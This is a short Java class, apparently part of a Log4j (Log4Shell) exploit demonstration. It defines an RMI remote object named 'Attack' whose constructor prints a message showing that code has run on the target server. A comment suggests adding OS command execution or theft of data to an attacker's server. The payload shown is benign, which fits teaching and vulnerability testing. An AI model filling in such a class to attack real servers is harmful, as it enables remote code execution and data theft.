package com.dyz.log4j.bug.back.hacker.logic;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class Attack extends UnicastRemoteObject {

    public Attack() throws RemoteException {
        super();
        // 添加任何攻击逻辑，比如使用runtime执行操作系统命令。或者窃取信息到攻击者的服务器。
        System.out.println("当你在服务端看到这句话，就意味着我可以在这里放任何攻击你的代码！");
    }
}
